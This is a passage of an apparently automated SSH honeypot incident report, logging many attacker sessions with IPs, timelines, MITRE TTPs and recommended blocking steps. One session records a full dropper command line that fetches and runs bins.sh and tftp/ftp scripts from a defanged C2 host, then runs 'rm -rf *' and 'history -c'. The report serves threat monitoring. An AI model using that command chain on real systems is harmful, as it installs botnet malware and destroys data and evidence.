| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:35 |
| **Last Seen** | 2026-06-25 07:36 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:35:45` | `cowrie.session.connect` |
| `2026-06-25 07:35:45` | `cowrie.client.version` |
| `2026-06-25 07:35:45` | `cowrie.client.kex` |
| `2026-06-25 07:35:46` | `cowrie.login.success` |
| `2026-06-25 07:35:47` | `cowrie.session.params` |
| `2026-06-25 07:35:47` | `cowrie.command.input` |
| `2026-06-25 07:35:47` | `cowrie.log.closed` |
| `2026-06-25 07:36:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a31acf079e05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:35 |
| **Last Seen** | 2026-06-25 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:35:53` | `cowrie.session.connect` |
| `2026-06-25 07:35:53` | `cowrie.client.version` |
| `2026-06-25 07:35:53` | `cowrie.client.kex` |
| `2026-06-25 07:35:53` | `cowrie.login.success` |
| `2026-06-25 07:35:54` | `cowrie.session.params` |
| `2026-06-25 07:35:54` | `cowrie.command.input` |
| `2026-06-25 07:35:54` | `cowrie.log.closed` |
| `2026-06-25 07:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77dc9ea799ea

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 07:36 |
| **Last Seen** | 2026-06-25 07:36 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:36:35` | `cowrie.session.connect` |
| `2026-06-25 07:36:37` | `cowrie.client.version` |
| `2026-06-25 07:36:37` | `cowrie.client.kex` |
| `2026-06-25 07:36:43` | `cowrie.login.success` |
| `2026-06-25 07:36:47` | `cowrie.session.params` |
| `2026-06-25 07:36:47` | `cowrie.command.input` |
| `2026-06-25 07:36:49` | `cowrie.log.closed` |
| `2026-06-25 07:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae0639ba818

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:36 |
| **Last Seen** | 2026-06-25 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:36:52` | `cowrie.session.connect` |
| `2026-06-25 07:36:52` | `cowrie.client.version` |
| `2026-06-25 07:36:52` | `cowrie.client.kex` |
| `2026-06-25 07:36:52` | `cowrie.login.success` |
| `2026-06-25 07:36:53` | `cowrie.session.params` |
| `2026-06-25 07:36:53` | `cowrie.command.input` |
| `2026-06-25 07:36:53` | `cowrie.log.closed` |
| `2026-06-25 07:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f  (Bash Script)
   SHA256: 725d1de20672ed85f32e823fe067ed6eb17149019e146baf...
   Score : 84/100  |  VT: 36/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ chmod +x (make executable): chmod +x
   ↳ IP:Port (possible C2): 51.158.248[.]122:8517
```

### 🔴 HIGH · IR-98aa60ab035d

| Field | Detail |
|---|---|
| **Source IP** | `51.158.248[.]122` |
| **First Seen** | 2026-06-25 07:37 |
| **Last Seen** | 2026-06-25 07:37 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp; wget hxxp://51.158.248[.]122:8517/bins.sh; curl -O hxxp://51.158.248[.]122:8517/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 51.158.248[.]122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 51.158.248[.]122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 51.158.248[.]122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *; history -c` |
| **Download Attempts** | hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/bins.sh, hxxp://51.158.248[.]122:8517/armv6l |
| **Malware Analysis** | 725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f (HIGH), 4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02 (MEDIUM), 494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984 (MEDIUM), 6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c (MEDIUM), 80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4 (MEDIUM) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:37:42` | `cowrie.session.connect` |
| `2026-06-25 07:37:42` | `cowrie.login.success` |
| `2026-06-25 07:37:43` | `cowrie.session.params` |
| `2026-06-25 07:37:44` | `cowrie.command.input` |
| `2026-06-25 07:37:44` | `cowrie.command.input` |
| `2026-06-25 07:37:45` | `cowrie.session.file_download` |
| `2026-06-25 07:37:45` | `cowrie.session.file_download` |
| `2026-06-25 07:37:45` | `cowrie.session.file_download` |
| `2026-06-25 07:37:45` | `cowrie.session.file_download.failed` |
| `2026-06-25 07:37:45` | `cowrie.session.file_download` |
| `2026-06-25 07:37:45` | `cowrie.session.file_download` |
| `2026-06-25 07:37:46` | `cowrie.session.file_download` |
| `2026-06-25 07:37:46` | `cowrie.session.file_download` |
| `2026-06-25 07:37:46` | `cowrie.session.file_download` |
| `2026-06-25 07:37:47` | `cowrie.session.file_download` |
| `2026-06-25 07:37:47` | `cowrie.session.file_download` |
| `2026-06-25 07:37:59` | `cowrie.log.closed` |
| `2026-06-25 07:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.158.248[.]122` to AbuseIPDB if not already reported
- [ ] Block `51.158.248[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620ca73b3f87

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 07:37 |
| **Last Seen** | 2026-06-25 07:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:37:50` | `cowrie.session.connect` |
| `2026-06-25 07:37:50` | `cowrie.client.version` |
| `2026-06-25 07:37:50` | `cowrie.client.kex` |
| `2026-06-25 07:37:50` | `cowrie.login.success` |
| `2026-06-25 07:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2fc22759a99

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 07:37 |
| **Last Seen** | 2026-06-25 07:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:37:50` | `cowrie.session.connect` |
| `2026-06-25 07:37:50` | `cowrie.client.version` |
| `2026-06-25 07:37:50` | `cowrie.client.kex` |
| `2026-06-25 07:37:50` | `cowrie.login.success` |
| `2026-06-25 07:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b352c0c19db7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:37 |
| **Last Seen** | 2026-06-25 07:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:37:50` | `cowrie.session.connect` |
| `2026-06-25 07:37:50` | `cowrie.client.version` |
| `2026-06-25 07:37:50` | `cowrie.client.kex` |
| `2026-06-25 07:37:51` | `cowrie.login.success` |
| `2026-06-25 07:37:52` | `cowrie.session.params` |
| `2026-06-25 07:37:52` | `cowrie.command.input` |
| `2026-06-25 07:37:52` | `cowrie.log.closed` |
| `2026-06-25 07:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28206f6e4a18

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 07:37 |
| **Last Seen** | 2026-06-25 07:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:37:54` | `cowrie.session.connect` |
| `2026-06-25 07:37:54` | `cowrie.client.version` |
| `2026-06-25 07:37:54` | `cowrie.client.kex` |
| `2026-06-25 07:37:54` | `cowrie.login.success` |
| `2026-06-25 07:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f0cece07f4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 07:37 |
| **Last Seen** | 2026-06-25 07:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:37:54` | `cowrie.session.connect` |
| `2026-06-25 07:37:54` | `cowrie.client.version` |
| `2026-06-25 07:37:54` | `cowrie.client.kex` |
| `2026-06-25 07:37:54` | `cowrie.login.success` |
| `2026-06-25 07:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c497523d40

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:38 |
| **Last Seen** | 2026-06-25 07:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:38:38` | `cowrie.session.connect` |
| `2026-06-25 07:38:38` | `cowrie.client.version` |
| `2026-06-25 07:38:38` | `cowrie.client.kex` |
| `2026-06-25 07:38:39` | `cowrie.login.success` |
| `2026-06-25 07:38:39` | `cowrie.session.params` |
| `2026-06-25 07:38:39` | `cowrie.command.input` |
| `2026-06-25 07:38:40` | `cowrie.log.closed` |
| `2026-06-25 07:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fc5ffba4801

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:38 |
| **Last Seen** | 2026-06-25 07:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:38:50` | `cowrie.session.connect` |
| `2026-06-25 07:38:50` | `cowrie.client.version` |
| `2026-06-25 07:38:50` | `cowrie.client.kex` |
| `2026-06-25 07:38:50` | `cowrie.login.success` |
| `2026-06-25 07:38:51` | `cowrie.session.params` |
| `2026-06-25 07:38:51` | `cowrie.command.input` |
| `2026-06-25 07:38:51` | `cowrie.log.closed` |
| `2026-06-25 07:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6499b10cefc1

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:39 |
| **Last Seen** | 2026-06-25 07:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:39:18` | `cowrie.session.connect` |
| `2026-06-25 07:39:18` | `cowrie.client.version` |
| `2026-06-25 07:39:18` | `cowrie.client.kex` |
| `2026-06-25 07:39:18` | `cowrie.login.success` |
| `2026-06-25 07:39:19` | `cowrie.session.params` |
| `2026-06-25 07:39:19` | `cowrie.command.input` |
| `2026-06-25 07:39:19` | `cowrie.log.closed` |
| `2026-06-25 07:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c032a4b1f7c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:39 |
| **Last Seen** | 2026-06-25 07:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:39:34` | `cowrie.session.connect` |
| `2026-06-25 07:39:34` | `cowrie.client.version` |
| `2026-06-25 07:39:34` | `cowrie.client.kex` |
| `2026-06-25 07:39:35` | `cowrie.login.success` |
| `2026-06-25 07:39:36` | `cowrie.session.params` |
| `2026-06-25 07:39:36` | `cowrie.command.input` |
| `2026-06-25 07:39:36` | `cowrie.log.closed` |
| `2026-06-25 07:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f79c689ee3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:39 |
| **Last Seen** | 2026-06-25 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:39:54` | `cowrie.session.connect` |
| `2026-06-25 07:39:54` | `cowrie.client.version` |
| `2026-06-25 07:39:54` | `cowrie.client.kex` |
| `2026-06-25 07:39:54` | `cowrie.login.success` |
| `2026-06-25 07:39:55` | `cowrie.session.params` |
| `2026-06-25 07:39:55` | `cowrie.command.input` |
| `2026-06-25 07:39:55` | `cowrie.log.closed` |
| `2026-06-25 07:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a91c4dff88

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:40 |
| **Last Seen** | 2026-06-25 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:40:54` | `cowrie.session.connect` |
| `2026-06-25 07:40:54` | `cowrie.client.version` |
| `2026-06-25 07:40:54` | `cowrie.client.kex` |
| `2026-06-25 07:40:54` | `cowrie.login.success` |
| `2026-06-25 07:40:55` | `cowrie.session.params` |
| `2026-06-25 07:40:55` | `cowrie.command.input` |
| `2026-06-25 07:40:55` | `cowrie.log.closed` |
| `2026-06-25 07:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38714610c6b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:41 |
| **Last Seen** | 2026-06-25 07:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:41:52` | `cowrie.session.connect` |
| `2026-06-25 07:41:52` | `cowrie.client.version` |
| `2026-06-25 07:41:52` | `cowrie.client.kex` |
| `2026-06-25 07:41:52` | `cowrie.login.success` |
| `2026-06-25 07:41:53` | `cowrie.session.params` |
| `2026-06-25 07:41:53` | `cowrie.command.input` |
| `2026-06-25 07:41:53` | `cowrie.log.closed` |
| `2026-06-25 07:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44acfcf23b92

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:42 |
| **Last Seen** | 2026-06-25 07:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:42:37` | `cowrie.session.connect` |
| `2026-06-25 07:42:37` | `cowrie.client.version` |
| `2026-06-25 07:42:38` | `cowrie.client.kex` |
| `2026-06-25 07:42:38` | `cowrie.login.success` |
| `2026-06-25 07:42:39` | `cowrie.session.params` |
| `2026-06-25 07:42:39` | `cowrie.command.input` |
| `2026-06-25 07:42:39` | `cowrie.log.closed` |
| `2026-06-25 07:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a2cb28e090c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:42 |
| **Last Seen** | 2026-06-25 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:42:50` | `cowrie.session.connect` |
| `2026-06-25 07:42:50` | `cowrie.client.version` |
| `2026-06-25 07:42:50` | `cowrie.client.kex` |
| `2026-06-25 07:42:51` | `cowrie.login.success` |
| `2026-06-25 07:42:51` | `cowrie.session.params` |
| `2026-06-25 07:42:51` | `cowrie.command.input` |
| `2026-06-25 07:42:51` | `cowrie.log.closed` |
| `2026-06-25 07:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c99330bea2a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:43 |
| **Last Seen** | 2026-06-25 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:43:51` | `cowrie.session.connect` |
| `2026-06-25 07:43:51` | `cowrie.client.version` |
| `2026-06-25 07:43:51` | `cowrie.client.kex` |
| `2026-06-25 07:43:51` | `cowrie.login.success` |
| `2026-06-25 07:43:52` | `cowrie.session.params` |
| `2026-06-25 07:43:52` | `cowrie.command.input` |
| `2026-06-25 07:43:52` | `cowrie.log.closed` |
| `2026-06-25 07:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37760d4b6325

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:44 |
| **Last Seen** | 2026-06-25 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:44:53` | `cowrie.session.connect` |
| `2026-06-25 07:44:53` | `cowrie.client.version` |
| `2026-06-25 07:44:53` | `cowrie.client.kex` |
| `2026-06-25 07:44:53` | `cowrie.login.success` |
| `2026-06-25 07:44:54` | `cowrie.session.params` |
| `2026-06-25 07:44:54` | `cowrie.command.input` |
| `2026-06-25 07:44:54` | `cowrie.log.closed` |
| `2026-06-25 07:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a0941650bea

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:45 |
| **Last Seen** | 2026-06-25 07:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:45:39` | `cowrie.session.connect` |
| `2026-06-25 07:45:39` | `cowrie.client.version` |
| `2026-06-25 07:45:40` | `cowrie.client.kex` |
| `2026-06-25 07:45:40` | `cowrie.login.success` |
| `2026-06-25 07:45:41` | `cowrie.session.params` |
| `2026-06-25 07:45:41` | `cowrie.command.input` |
| `2026-06-25 07:45:42` | `cowrie.log.closed` |
| `2026-06-25 07:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f60851b892ea

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:45 |
| **Last Seen** | 2026-06-25 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:45:56` | `cowrie.session.connect` |
| `2026-06-25 07:45:56` | `cowrie.client.version` |
| `2026-06-25 07:45:56` | `cowrie.client.kex` |
| `2026-06-25 07:45:56` | `cowrie.login.success` |
| `2026-06-25 07:45:57` | `cowrie.session.params` |
| `2026-06-25 07:45:57` | `cowrie.command.input` |
| `2026-06-25 07:45:57` | `cowrie.log.closed` |
| `2026-06-25 07:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a63039d176

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:46 |
| **Last Seen** | 2026-06-25 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:46:57` | `cowrie.session.connect` |
| `2026-06-25 07:46:57` | `cowrie.client.version` |
| `2026-06-25 07:46:57` | `cowrie.client.kex` |
| `2026-06-25 07:46:57` | `cowrie.login.success` |
| `2026-06-25 07:46:58` | `cowrie.session.params` |
| `2026-06-25 07:46:58` | `cowrie.command.input` |
| `2026-06-25 07:46:58` | `cowrie.log.closed` |
| `2026-06-25 07:46:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3888ffd8740

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:47 |
| **Last Seen** | 2026-06-25 07:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:47:47` | `cowrie.session.connect` |
| `2026-06-25 07:47:47` | `cowrie.client.version` |
